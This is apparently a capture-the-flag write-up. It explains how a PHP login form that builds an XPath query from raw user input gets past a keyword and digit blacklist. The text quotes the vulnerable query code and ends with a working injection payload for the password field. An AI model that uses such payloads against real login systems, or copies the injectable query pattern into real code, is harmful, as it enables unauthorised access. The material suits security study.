Given an authorization form, we try to insert quotes and get an error

Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/html/index.php on line 42

We understand that the request is processed using XPath. Going to the source code of the page, we find a link to the source code of the application. We see that user input via the login and password fields is filtered:

$blacklist = Array('or','0', '1', '2', '3', '4', '5', '6', '7', '8', '9');

Also, we observe a very strange verification of the correctness of the data entered by the user

$query = "//users/user[login/text()='$login' and password/text()='$pass']";

$result = $xml->xpath($query);
if(!$result){
    echo "Неверные логин или пароль";
}
else{
    $user_data = $xml->xpath("//users/user[login/text()='$login']")[0];
    $flag = $user_data->flag;
    echo "Твой флаг: ".$flag;
}

Given the filters, we get an injection:

login - admin
pass - '] | /* | /foo[bar='